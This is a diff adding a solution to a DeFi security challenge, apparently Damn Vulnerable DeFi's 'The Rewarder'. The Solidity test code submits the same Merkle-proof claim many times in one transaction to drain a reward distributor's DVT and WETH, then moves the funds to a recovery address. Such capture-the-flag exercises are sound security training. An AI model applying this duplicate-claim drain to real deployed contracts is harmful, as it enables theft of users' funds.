@@ -148,7 +148,61 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // The vulnerability resides in the claimRewards function of TheRewarderDistributor.sol
+        // The function does not check if the claimer has already claimed the rewards unless the token is different from the previous claim or it is the last claim in the list.
+        // This allows the claimer to claim the same rewards multiple times by sending the same claim multiple times in the same transaction.
+        // This will effectively drain the distributor of all the tokens.
+
+        uint256 dvtPlayerClaimAmount = 11524763827831882;
+        uint256 wethPlayerClaimAmount = 1171088749244340;
+
+        // Calculate the amount of same claim needed to drain the distributor
+        uint256 dvtTxAmount = (TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT) / dvtPlayerClaimAmount;
+        uint256 wethTxAmount = (TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT) / wethPlayerClaimAmount;
+
+        // Create the claims
+        // We need to know the index of the player claim in the distribution files
+        // Since each claim is 4 lines, with the first line being the opening bracket, we can calculate the index as follows:
+        // index = claimline/4 (notice that the Alice claim is at index 2, but its the third claim in the file, because it start with 0)
+        // search for the player address we have the player address in the line 754-757 => index = 754 / 4 = 188
+
+        Claim[] memory playerClaims = new Claim[](dvtTxAmount + wethTxAmount);
+
+        // Set DVT and WETH as tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // Create DVT claims
+        for (uint256 i = 0; i < dvtTxAmount; i++) {
+            playerClaims[i] = Claim({
+                batchNumber: 0,
+                amount: dvtPlayerClaimAmount,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, 188)
+            });
+        }
+
+        // Create WETH claims
+        for (uint256 i = 0; i < wethTxAmount; i++) {
+            playerClaims[dvtTxAmount + i] = Claim({
+                batchNumber: 0,
+                amount: wethPlayerClaimAmount,
+                tokenIndex: 1,
+                proof: merkle.getProof(wethLeaves, 188)
+            });
+        }
+
+        // Drain the distributor
+        distributor.claimRewards({inputClaims: playerClaims, inputTokens: tokensToClaim});
+
+        // transfer the funds to the recovery account
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+
     }
 
     /**
